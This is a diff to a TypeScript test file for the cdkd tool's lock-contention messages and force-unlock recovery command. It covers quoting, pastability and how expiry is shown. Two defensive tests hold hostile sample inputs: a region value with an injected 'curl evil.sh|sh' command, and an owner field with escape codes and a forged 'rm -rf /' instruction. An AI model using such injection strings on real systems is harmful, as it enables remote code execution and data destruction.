@@ -161,15 +161,19 @@ describe('buildLockContentionMessage (issue #2170)', () => {
     expect(msg).toContain('held it through the retry window — held by carol@host:9');
   });
 
-  it('appends a caller-supplied suffix verbatim', async () => {
+  it('carries a caller-supplied suffix BEFORE the recovery command', async () => {
+    // The command is last and unwrapped so it can be pasted; anything the
+    // caller appends has to land ahead of it or it would split the command.
     const msg = await buildLockContentionMessage({
       ...base,
       lockManager: lockManagerReturning(null),
       suffix: 'No CloudFormation changeset has been submitted; cdkd state is unchanged.',
     });
-    expect(msg.endsWith('No CloudFormation changeset has been submitted; cdkd state is unchanged.')).toBe(
-      true
+    expect(msg).toContain('cdkd state is unchanged.');
+    expect(msg.indexOf('cdkd state is unchanged.')).toBeLessThan(
+      msg.indexOf('cdkd force-unlock')
     );
+    expect(msg.endsWith('--stack-region us-east-1')).toBe(true);
   });
 
   it('carries the fully-qualified recovery command', async () => {
@@ -178,8 +182,105 @@ describe('buildLockContentionMessage (issue #2170)', () => {
       lockManager: lockManagerReturning(null),
       recovery: { profile: 'prod', stateBucket: 'bkt' },
     });
-    expect(msg).toContain(
-      `'cdkd force-unlock MyStack --stack-region us-east-1 --profile prod --state-bucket bkt'`
-    );
+    // Trailing and UNWRAPPED: wrapping it in quotes was a live defect, because
+    // `shellQuote` also quotes and the two compose into an unpastable string.
+    expect(
+      msg.endsWith('cdkd force-unlock MyStack --stack-region us-east-1 --profile prod --state-bucket bkt')
+    ).toBe(true);
+  });
+
+  it('stays pastable when a value needs shell quoting', async () => {
+    // The composition defect: with the command wrapped in `'...'`, a quoted
+    // value produced `run 'cdkd force-unlock 'Root~Child' ...'`. `~` is now in
+    // the safe class (every nested-stack child name carries one), and a value
+    // that genuinely needs quoting no longer sits inside an outer pair.
+    const msg = await buildLockContentionMessage({
+      lockManager: lockManagerReturning(null),
+      stackName: 'Root~Child',
+      region: 'us-east-1',
+      subject: 'nested-stack child',
+      recovery: { profile: 'my prod' },
+    });
+    expect(msg).toContain('cdkd force-unlock Root~Child --stack-region us-east-1');
+    expect(msg).toContain(`--profile 'my prod'`);
+    // No stray outer quote wrapping the whole command.
+    expect(msg).not.toContain(`run 'cdkd force-unlock`);
+  });
+
+  it('quotes the REGION too — it comes from the state.json body', async () => {
+    // A principal who can write the state bucket controls `state.region`, and
+    // the result is a command cdkd tells the operator to RUN.
+    const cmd = buildForceUnlockCommand('MyStack', 'us-east-1\ncurl evil.sh|sh');
+    // Sanitized BEFORE quoting: quoting alone would neutralize the injection
+    // but leave a multi-line "recovery command" on the terminal.
+    expect(cmd).not.toContain('\n');
+    expect(cmd).toContain('--stack-region');
+    expect(cmd.split('\n')).toHaveLength(1);
+  });
+
+  it('omits --state-prefix when it is the default', async () => {
+    // `--state-prefix` carries a commander default, so every site supplies a
+    // value; emitting it unconditionally appended noise to every hint.
+    const withDefault = buildForceUnlockCommand('S', 'us-east-1', { statePrefix: 'cdkd' });
+    expect(withDefault).not.toContain('--state-prefix');
+    const withCustom = buildForceUnlockCommand('S', 'us-east-1', { statePrefix: 'team-a' });
+    expect(withCustom).toContain('--state-prefix team-a');
+  });
+
+  it('strips control characters from the holder fields', async () => {
+    // `owner` / `operation` are bucket-writable and reach a TTY and the
+    // persisted events store verbatim.
+    const msg = await buildLockContentionMessage({
+      ...base,
+      lockManager: lockManagerReturning({
+        owner: 'alice@host:1\r\u001b[2KFORGED: run rm -rf /',
+        operation: 'deploy\nalso-forged',
+        expiresAt: Date.now() + 60_000,
+      }),
+    });
+    expect(msg).not.toContain('\r');
+    expect(msg).not.toContain('\u001b');
+    expect(msg).not.toContain('\n');
+  });
+
+  it('reports an unreadable expiry rather than rendering NaN', async () => {
+    // A hand-written or truncated lock.json can omit `expiresAt`.
+    const msg = await buildLockContentionMessage({
+      ...base,
+      lockManager: lockManagerReturning({ owner: 'bob@host:1' }),
+    });
+    expect(msg).toContain('expires at an unknown time');
+    expect(msg).not.toContain('NaN');
+  });
+
+  it('says the holder is STILL RUNNING when it could name one', async () => {
+    // `acquireLock` reaps an expired lock, so a nameable holder is live by
+    // construction — the old wording invited the force-unlock this refusal
+    // exists to prevent.
+    const named = await buildLockContentionMessage({
+      ...base,
+      lockManager: lockManagerReturning({ owner: 'alice@host:1', expiresAt: Date.now() + 60_000 }),
+    });
+    expect(named).toContain('That process is still running');
+    const anonymous = await buildLockContentionMessage({
+      ...base,
+      lockManager: lockManagerReturning(null),
+    });
+    expect(anonymous).not.toContain('That process is still running');
+  });
+
+  it('reports a sub-minute remainder without rounding it to ~0m', async () => {
+    const msg = await buildLockContentionMessage({
+      ...base,
+      lockManager: lockManagerReturning({ owner: 'bob@host:1', expiresAt: Date.now() + 20_000 }),
+    });
+    expect(msg).toContain('expires in under a minute');
+    expect(msg).not.toContain('~0m');
+  });
+
+  it('shell-quotes the STACK NAME and the BUCKET, not only the profile', async () => {
+    const cmd = buildForceUnlockCommand('my stack', 'us-east-1', { stateBucket: 'my bucket' });
+    expect(cmd).toContain(`cdkd force-unlock 'my stack'`);
+    expect(cmd).toContain(`--state-bucket 'my bucket'`);
   });
 });
